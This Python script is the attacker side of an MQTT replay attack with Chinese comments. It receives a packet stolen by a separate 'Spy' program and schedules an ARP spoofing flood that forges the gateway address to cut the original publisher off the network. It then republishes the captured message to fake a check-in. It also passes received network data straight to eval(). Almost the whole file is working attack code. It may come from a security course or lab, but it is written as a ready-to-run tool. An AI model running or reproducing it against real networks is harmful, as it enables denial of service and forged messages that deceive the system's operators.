# coding:utf-8
import sys
import json
import _thread
import datetime as dt

import socket
from halo import Halo
from scapy.all import send
from scapy.layers.l2 import ARP
from paho.mqtt.client import Client
from apscheduler.schedulers.blocking import BlockingScheduler


def on_connect(client: Client, userdata, flags, rc, properties=None):
    """ mqtt连接回调函数 """
    global isOk
    status = ['连接成功', '协议版本错误', '客户端标识符无效',
              '服务器不可用', '用户名或密码错误', '未授权']
    if rc != 0:
        sys.exit(status[rc])
    else:
        with open('captured_packet.json', encoding='utf-8') as f:
            packet_info = json.load(f)
        # 发布信息
        print('🙉 代理服务器连接成功！')
        client.publish(packet_info['topic'], packet_info['msg'], 1)
        print('🙊 假数据包发送成功！')
        isOk = True
        client.disconnect()


def publish_job():
    """ 打卡任务 """
    client = Client()
    client.on_connect = on_connect
    with open('captured_packet.json', encoding='utf-8') as f:
        packet_info = json.load(f)
    # 连接代理服务器
    print('🙈 正在连接代理服务器...')
    client.connect(packet_info['dst host'], 1883)
    client.loop_forever()


def publish():
    """ 定时发布打卡信息 """
    scheduler = BlockingScheduler()
    scheduler.add_job(publish_job, 'cron', hour=pub_attack_time.hour,
                      minute=pub_attack_time.minute, second=pub_attack_time.second)
    scheduler.start()


def arp_attack_job():
    """ ARP 攻击任务 """
    with open('captured_packet.json', encoding='utf-8') as f:
        pdst = json.load(f)['src host']

    packet = ARP(psrc='192.168.43.1',
                 hwsrc='11:22:33:44:55:66', pdst=pdst, op=2)
    print(f'👿 正在对 Publisher - {pdst} 进行ARP攻击')
    # 循环发送数据包使目标主机无法联网
    while not isOk:
        send(packet, verbose=False)


def arp_attack():
    """ ARP 攻击 """
    scheduler = BlockingScheduler()
    scheduler.add_job(arp_attack_job, 'cron', hour=arp_attack_time.hour,
                      minute=arp_attack_time.minute, second=arp_attack_time.second)
    scheduler.start()


if __name__ == "__main__":

    host = '192.168.43.212'
    port = 1884

    with socket.socket() as s:
        # 绑定ip和端口
        s.bind((host, port))
        s.listen(5)
        spinner = Halo(f'正在监听 {port} 端口...', spinner='dots')
        spinner.start()

        # 等待客户端发来数据包
        connect, address = s.accept()
        spinner.succeed(' 收到 Spy 窃取的数据包')
        with connect:
            packet_info = eval(connect.recv(1024).decode('utf-8'))

    # 保存捕获的数据包
    with open('captured_packet.json', 'w', encoding='utf-8') as f:
        json.dump(packet_info, f)

    # 记录当前时间
    get_packet_time = dt.datetime.now()
    arp_attack_time = get_packet_time + dt.timedelta(seconds=40)
    pub_attack_time = arp_attack_time + dt.timedelta(minutes=1)
    print(f'🤬 计划在 {arp_attack_time} 对 {packet_info["src host"]} 发起 ARP 攻击')
    print(f'👹 计划在 {pub_attack_time} 发起重现攻击')

    # 开启两个线程，一个定时进ARP攻击，一个定时打卡
    isOk = False
    _thread.start_new_thread(arp_attack, ())
    _thread.start_new_thread(publish, ())

    while 1:
        if isOk:
            sys.exit('😝 关闭服务器')
